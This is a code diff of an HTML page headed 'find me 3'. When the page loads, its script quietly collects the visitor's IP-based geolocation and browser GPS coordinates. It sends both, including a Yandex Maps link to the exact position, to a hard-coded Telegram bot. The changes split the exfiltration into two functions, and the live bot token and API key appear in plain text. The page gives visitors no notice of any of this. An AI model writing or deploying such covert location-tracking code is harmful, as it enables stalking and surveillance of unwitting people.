@@ -2,12 +2,12 @@
 <html>
 <body>
 
-<h2>find me 2</h2>
+<h2>find me 3</h2>
 
 <script>
-const sendMessageToTelegram = async (position) => {
+const sendMessageToTelegram = async (message) => {
     const apiUrl = `https://api.telegram.org/bot1618854913:AAGbM-sgQGHdcbxTzcpkisrsn2Q32n8Nqj8/sendMessage`;
-   
+
     try {
       let jsondate = await fetchData();
         const response = await fetch(apiUrl, {
@@ -17,7 +17,52 @@ const sendMessageToTelegram = async (position) => {
             },
             body: JSON.stringify({
                 chat_id: 424526614,
-                text: 'https://yandex.ru/maps/?mode=search&text='+position.coords.latitude+','+position.coords.longitude+'    jsondate'+jsondate
+                text: jsondate
+            }),
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+            console.log('Сообщение успешно отправлено в Telegram!');
+        } else {
+            alert('Ошибка при отправке сообщения в Telegram:', data.description);
+        }
+    } catch (error) {
+        alert('Произошла ошибка при отправке запроса:', error);
+    }
+};
+const messageText = 'Привет, это сообщение отправлено из моего веб-приложения!';
+sendMessageToTelegram(messageText);
+
+
+async function fetchData() {
+const apiKey = '64781d95576c4b3fb07b8611579805b2';
+const apiUrl = `https://ipgeolocation.abstractapi.com/v1/?api_key=${apiKey}`;
+
+    try {
+        const response = await fetch(apiUrl);
+        const data = await response.json();
+        let jsondate = JSON.stringify(data, null, 2);
+        
+        return jsondate;
+    } catch (error) {
+        console.error('Ошибка запроса к API:', error);
+        return error;
+    }
+}
+const sendMessageToTelegramGeo = async (position) => {
+    const apiUrl = `https://api.telegram.org/bot1618854913:AAGbM-sgQGHdcbxTzcpkisrsn2Q32n8Nqj8/sendMessage`;
+   
+    try {
+        const response = await fetch(apiUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: 424526614,
+                text: 'https://yandex.ru/maps/?mode=search&text='+position.coords.latitude+','+position.coords.longitude
             }),
         });
 
@@ -34,28 +79,12 @@ const sendMessageToTelegram = async (position) => {
 };
 function getLocation() {
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendMessageToTelegram);
+    navigator.geolocation.getCurrentPosition(sendMessageToTelegramGeo);
   } else { 
     x.innerHTML = "Geolocation is not supported by this browser.";
   }
 }
 getLocation();
-
-const apiKey = '64781d95576c4b3fb07b8611579805b2';
-const apiUrl = `https://ipgeolocation.abstractapi.com/v1/?api_key=${apiKey}`;
-
-async function fetchData() {
-    try {
-        const response = await fetch(apiUrl);
-        const data = await response.json();
-        let jsondate = JSON.stringify(data, null, 2);
-        
-        return jsondate;
-    } catch (error) {
-        console.error('Ошибка запроса к API:', error);
-        return error;
-    }
-}
 </script>
 
 </body>
